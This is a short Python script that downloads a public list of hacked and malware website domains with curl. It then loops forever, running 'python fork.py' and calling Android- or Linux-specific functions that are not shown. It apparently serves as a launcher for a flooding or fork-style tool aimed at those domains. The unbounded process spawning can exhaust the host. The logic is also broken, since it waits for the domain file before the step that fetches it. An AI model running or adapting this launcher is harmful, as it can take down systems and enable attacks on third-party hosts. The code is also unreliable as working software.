import os
import platform
import time
from android import android
from linux import linux
_os = ""
_number = 0
file = os.getcwd() + "/domains.txt"
while not os.path.isfile(file):
  time.sleep(1)
if _number == 0:
  os.system("curl -O https://raw.githubusercontent.com/mitchellkrogza/The-Big-List-of-Hacked-Malware-Web-Sites/refs/heads/master/.dev-tools/_strip_domains/domains.txt")
  _number = 1
else:
  pass
if platform.system() == "Android":
  _os = "android"
elif platform.system() == "Linux":
  _os = "linux"
else:
  pass
while True:
  os.system("python fork.py")
  if _os == "android":
    android()
  elif _os == "linux":
    linux()
  else:
    pass
